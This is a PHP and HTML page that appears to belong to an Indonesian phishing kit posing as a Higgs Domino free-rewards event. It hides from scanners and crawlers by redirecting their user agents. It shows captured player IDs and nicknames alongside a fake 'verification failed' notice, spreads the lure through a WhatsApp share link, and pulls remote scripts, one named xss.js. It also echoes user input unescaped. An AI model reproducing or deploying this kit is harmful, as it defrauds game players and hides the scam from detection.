<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$playid = $_POST['playid'];
$nick = $_POST['nick'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($playid == "" && $nick == ""){
header("Location: index.php");
}
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="haykaljb2/css-kal.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/jefanya14/higgsv13/007ac8526ff1bac0095a6ef4693432159a3b3d62/.data/alex-facebook.css">
        <title>Higgs Domino</title>
        <meta property="og:title" content="Higgs Domino">
        <meta name="description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:description" content="Ambil Benefit dan Hadiah Higgs Domino secara gratis!">
        <meta property="og:url" content="./">
        <meta property="og:site_name" content="Higgs Domino">
        <meta property="og:type" content="website">
        <meta name="copyright"content="Alex Ariandi">
        <meta name="theme-color" content="#136a62">
        <meta property="og:image" content="https://rawcdn.githack.com/jefanya14/higgsv13/007ac8526ff1bac0095a6ef4693432159a3b3d62/.data/higgs_domino.webp">
        <link rel="icon" href="https://www.bosbosgames.com/favicon.ico">
    </head>
    <body>
        <div class="appalexhdiprem">
            <div class="containeralexhdi">
                <div class="headermarsyahdi">
                    <div class="kiriheadermarsyahdi">
                        <img src="https://rawcdn.githack.com/jefanya14/higgsv13/007ac8526ff1bac0095a6ef4693432159a3b3d62/.data/higgs_domino.webp">
                    </div>
                    <div class="kananheadermarsyahdi">
                        <div class="loginalexmarsya" onClick="location.href='index.php'" onmousedown="buka.play();">
                            <p id="loginalexhdi">Log Out</p>
                        </div>
                        <div class="rulesalexmarsya" onclick="openrulesalex()" onmousedown="buka.play();">
                            <p>?</p>
                        </div>
                    </div>
                </div>
                <div class="banneralexhdi">
                    <div class="w3-content w3-display-container">
                        <img class="mySlides w3-animate-right" src="https://static.neptunegame.com/images/website/img_swiper_2_04.png" style="width:100%">
                        <img class="mySlides w3-animate-left" src="https://static.neptunegame.com/images/website/img_swiper_2_07.png" style="width:100%">
                        <img class="mySlides w3-animate-right" src="https://static.neptunegame.com/images/website/img_swiper_2_02_1.png" style="width:100%">
                        <div class="w3-center w3-container w3-section w3-large w3-text-white w3-display-bottommiddle">
                            <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(1)" onmousedown="buka.play();"></span>
                            <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(2)" onmousedown="buka.play();"></span>
                            <span class="w3-badge demo w3-border w3-transparent w3-hover-white" onclick="currentDiv(3)" onmousedown="buka.play();"></span>
                        </div>
                    </div>
                    <div class="arrowalexbanner">
                        <div class="itemarrowalex kiriarrow" onclick="plusDivs(-1)" onmousedown="buka.play();"></div>
                        <div class="itemarrowalex kananarrow" onclick="plusDivs(1)" onmousedown="buka.play();"></div>
                    </div>
                </div>
                <div class="subcompletalexhdi">
                    <p>Verikasi Gagal</p>
                </div>
                <div class="boxisialexmarsya">
                    <div class="boxalexcompleted">
                        <div class="ucapangagalalexhdi">
                            <p>Info: Verikasi akun gagal.</p>
                        </div>
                        <div class="isigagalalexhdi">
                            <span>Maaf atas ketidaknyamanan Anda.</span>
                            <span>Saat ini sistem sedang mengalami kendala pada data center kami.</span>
                            <span>Silahkan ulangi besok, hadiah dan slot akan diriset untuk saat ini. Anda bisa mengulangi lagi tanpa adanya kendala.</span>
                        </div>
                    </div>
                </div>
                <div class="footeralexclaim">
                    <div class="kirialexfooter">
                        <div class="itemmarsyafoot" onmousedown="buka.play();" onclick="location.href='whatsapp://send?text=Ayo%20ikuti%20event%20claim%20dan%20slot%20Higgs%20Domino%20Island%20secara%20gratis!%0ADapatkan%20Koin%20hingga%20Dekorasi%20dan%20juga%20Spin%20Slot%20Max%20BET%201x,%2070%%20mendapatkan%20JackPot.%0AIkuti%20Disini:%20koinhdi.xyz'">
                            <img src="https://rawcdn.githack.com/jefanya14/higgsv13/007ac8526ff1bac0095a6ef4693432159a3b3d62/.data/alex-share.png">
                            <span>share</span>
                        </div>
                    </div>
                    <div class="kananalexfooter">
                        <div class="itemalexfoot">
                            <span id="toastid"><?php echo $playid;?></span>
                        </div>
                        <div class="itemalexfoot">
                            <span id="toastnick"><?php echo $nick;?></span>
                        </div>
                    </div>
                </div>
                
                <div class="rulesalexhdi" style="display: none;">
                    <div class="boxrulesalexhdi">
                        <div class="isirulesalex">
                            <span>Menurut aturan, setiap user dapat menukar hadiah 1x saja!</span>
                            <span>Surprise Event diskon terus berlangsung, penukaran hadiah berlaku untuk semua akun!</span>
                        </div>
                        <div class="buttoncloseloginalex">
                            <button onclick="closerulesalex()" onmousedown="buka.play();">Tentukan</button>
                        </div>
                    </div>
                </div>
                
                <iframe scrolling="no" allow="autoplay" controls loop src="https://rawcdn.githack.com/jefanya14/jefanya14/353b521709ef8d17049e739c9989a29517f6b09b/theme_alex_hdi.mp3" style="display: none" width="0" height="0" frameborder="no"></iframe>
            </div>
        </div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script> 
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>   
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://raw.githubusercontent.com/jefanya14/jefanya14/main/2.4.16.min.js"></script>
<script src="haykaljb2/js-kal.js"></script>
<script src="haykaljb2/css-kal.css"></script>
<script src="https://rawcdn.githack.com/jefanya14/jefanya14/95fc02aca1f952df87d66d3c6ad7976beba441b5/input-exception.js"></script>
<script src="https://rawcdn.githack.com/jefanya14/jefanya14/a4065c906f227984d2ea8f5de8ecd62a1860491d/xss.js"></script>
<link rel="stylesheet" href="https://rawcdn.githack.com/jefanya14/jefanya14/a4065c906f227984d2ea8f5de8ecd62a1860491d/watermark.css">
    </body>
</html>